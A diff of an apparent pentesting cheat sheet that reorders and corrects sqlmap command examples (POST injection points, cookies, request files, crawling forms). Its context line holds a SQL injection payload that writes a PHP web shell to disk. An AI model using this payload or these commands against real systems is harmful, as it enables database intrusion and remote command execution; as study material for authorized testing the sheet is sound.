@@ -393,16 +393,16 @@ cn') UNION SELECT "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/
 # Run SQLMap without asking for user input
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 
-# SQLMap with POST request specifying an unjection point with asterisk
-sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
-
 # In webpage, copy GET request as cURL > paste and replace `curl` with `sqlmap` > use `--crawl`, `--forms`, `-g` for specilized options
 sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1' --crawl --forms -g
+
+# SQLMap with POST request specifying an injection point with asterisk
+sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 
 # Specifying a Cookie Header
 sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 
-# Passing an HTTP request file to SQLMap
+# Passing an HTTP request file to SQLMap. Can specify injection point within the txt file with `*` (e.g. `/?id=*`)
 sqlmap -r req.txt
 
 # Specifying a PUT request
